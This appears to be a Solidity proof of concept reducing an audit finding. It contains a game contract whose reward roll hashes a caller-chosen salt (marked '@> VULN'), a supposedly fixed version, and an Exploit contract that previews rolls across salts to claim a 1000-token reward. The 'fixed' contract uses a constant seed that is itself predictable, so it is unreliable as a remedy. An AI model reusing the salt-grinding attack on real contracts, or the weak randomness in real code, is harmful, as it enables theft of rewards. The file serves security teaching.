// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  PenguinGotchi — doActivity randomness is keccak(penguinId, timestamp, salt)
    (Shieldify H-01, finding 57907).
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    The caller picks salt. The standing signature has no expiry and does not bind salt.
    The attacker previews the roll and calls doActivity only when it is under 50,
    then receives 1000. A committed seed the attacker cannot set rolls 99 and pays 0.
    The blamed hash is preserved (@> VULN). run() does not warp. */

contract MockToken {
    string public name = "Activity Reward";
    string public symbol = "FISH";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        totalSupply += amount;
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Game {
    uint256 public constant PERCENT = 100;
    uint256 public constant SUCCESS = 50;
    bytes4 public constant STANDING = 0x01020304;

    MockToken public token;
    mapping(address => bool) public isAuthorized;
    uint256 public lastRoll;
    uint256 public paidOut;

    constructor(address token_) {
        token = MockToken(token_);
    }

    function authorize(address who) external {
        isAuthorized[who] = true;
    }

    // Quoted validSignature: signer check only, no timeout, salt is not covered.
    modifier validSignature(bytes calldata signature) {
        require(signature.length == 4 && bytes4(signature) == STANDING, "sig");
        require(isAuthorized[msg.sender], "signer");
        _;
    }

    function doActivity(uint256 penguinId, bytes32 salt, bytes calldata signature)
        external
        validSignature(signature)
        returns (uint256 paid)
    {
        // @> VULN: roll is keccak(penguinId, block.timestamp, salt), and the caller chooses salt
        lastRoll = uint256(keccak256(abi.encodePacked(penguinId, block.timestamp, salt))) % PERCENT;
        // FIX: use a committed seed the caller cannot set
        if (lastRoll < SUCCESS) {
            paid = 1000 ether;
            paidOut = paid;
            token.transfer(msg.sender, paid);
        }
    }
}

contract GameFixed {
    MockToken public token;
    uint256 public constant SEED = 1;
    mapping(address => bool) public isAuthorized;

    constructor(address token_) {
        token = MockToken(token_);
    }

    function authorize(address who) external {
        isAuthorized[who] = true;
    }

    function doActivity(uint256 penguinId, bytes32 salt, bytes calldata signature) external returns (uint256 paid) {
        salt;
        signature;
        require(isAuthorized[msg.sender], "signer");
        uint256 roll = uint256(keccak256(abi.encodePacked(SEED, penguinId))) % 100;
        if (roll < 50) {
            paid = 1000 ether;
            token.transfer(msg.sender, paid);
        }
    }
}

contract Exploit {
    uint256 public constant PENGUIN = 1;
    uint256 public constant REWARD = 1000 ether;

    MockToken public token;
    Game public game;
    bytes32 public chosenSalt;
    uint256 public chosenRoll;
    uint256 public tries;
    uint256 public paid;

    constructor() {
        token = new MockToken();
        game = new Game(address(token));
    }

    function run() external {
        token.mint(address(game), REWARD);
        game.authorize(address(this));
        bytes memory sig = abi.encodePacked(game.STANDING());
        for (uint256 i = 0; i < 64; ++i) {
            bytes32 salt = bytes32(i);
            uint256 preview = uint256(keccak256(abi.encodePacked(PENGUIN, block.timestamp, salt))) % 100;
            tries = i + 1;
            if (preview < 50) {
                chosenSalt = salt;
                chosenRoll = preview;
                paid = game.doActivity(PENGUIN, salt, sig);
                break;
            }
        }
        require(tries > 0, "no search");
        require(chosenRoll < 50, "roll was not a win");
        require(paid == REWARD, "reward was not paid");
        require(token.balanceOf(address(this)) == REWARD, "attacker balance");
        require(game.lastRoll() == chosenRoll, "game rolled a different value");
    }
}
